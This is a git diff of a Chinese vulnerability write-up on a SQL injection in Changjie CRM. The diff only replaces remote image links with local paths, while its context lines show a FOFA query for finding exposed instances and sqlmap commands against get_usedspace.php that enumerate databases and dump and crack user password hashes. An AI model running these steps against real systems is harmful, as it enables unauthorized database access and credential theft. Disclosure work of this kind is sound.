@@ -61,7 +61,7 @@ fofa: "title=\"畅捷CRM\""
 
 畅捷 CRM
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BM03iaJI15BvAavxeKTvFu3ZyYibkfKtrQ1N3S31TyXjh8Q5mic3DDbd5n1mgetMMxI9K2icJTxjU42cw/640?wx_fmt=png)
+![](../../.resource/remote/1b8284589a037e8ddba682625cef6e2529b09706faa386a38cc64ec529222195.png)
 
 三、漏洞描述
 
@@ -182,7 +182,7 @@ sqlmap -u "http://x.x.x.x:xx/WebSer~1/get_usedspace.php?site_id=1" --dbs
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOfqwkwml84pnvHN3Xwyy1QSn106WFk2pfE6m22m4SDJCLFjWQIDgoW1xnxaRmZrnjR2rGJjZhLiag/640?wx_fmt=png)
+![](../../.resource/remote/72429ebdd5cfb6fdcb1ac6ff2c71351e53edaa754c945d7aff5e34d92f8172d4.png)
 
 使用 sqlmap 获取数据库表名
 
@@ -191,7 +191,7 @@ sqlmap -u "http://x.x.x.x:xx/WebSer~1/get_usedspace.php?site_id=1" -D crmsaas_pl
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOfqwkwml84pnvHN3Xwyy1Qf3lIuwthmxhe1B2qTyTtliaW8EUuyDHJcTwKRZhofszKCkdhga4HTiaA/640?wx_fmt=png)
+![](../../.resource/remote/11e95bdb8e02663570dd7ea83f867bce22cc747f79afce20c5e3cbf1eb02da66.png)
 
 使用 sqlmap 获取系统用户名密码，通过 sqlmap MD5 解密即可得到明文密码
 
@@ -200,7 +200,7 @@ sqlmap -u "http://x.x.x.x:xx/WebSer~1/get_usedspace.php?site_id=1" -D crmsaas_pl
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BM03iaJI15BvAavxeKTvFu3ZKUWib81a15cVkiamQ24a6P5yLnp7TDRv5UyzdVRE7dia1N63gnU70dLKw/640?wx_fmt=png)
+![](../../.resource/remote/0fa5178ebdb1d1f048f63eca9c62fbf5fbfd1118fee650f67a161413241c04a0.png)
 
 八、漏洞修复
 
